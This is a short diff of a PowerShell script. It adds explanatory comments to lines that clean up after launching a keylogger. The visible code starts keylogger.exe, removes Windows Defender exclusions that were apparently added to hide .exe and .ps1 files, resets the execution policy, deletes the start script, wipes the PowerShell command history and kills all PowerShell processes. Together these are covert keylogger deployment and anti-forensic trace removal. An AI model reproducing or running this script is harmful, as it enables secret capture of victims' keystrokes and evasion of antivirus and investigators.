@@ -6,6 +6,6 @@ Start-Process keylogger.exe #Start keylogger script
 Remove-MpPreference -ExclusionExtension exe -Force #Reser .exe files exception in antivirus
 Remove-MpPreference -ExclusionExtension ps1 -Force #Reset .ps1 files exception in antivirus
 Set-ExecutionPolicy restricted -Force #Reset script execution policy
-Remove-Item C:\Users\Public\Documents\startScript.ps1
-Clear-Content (Get-PSReadlineOption).HistorySavePath
-taskkill -F /IM powershell.exe
+Remove-Item C:\Users\Public\Documents\startScript.ps1 #Delete ps1 script
+Clear-Content (Get-PSReadlineOption).HistorySavePath #Clear powershell command history
+taskkill -F /IM powershell.exe #Kill all powershell process
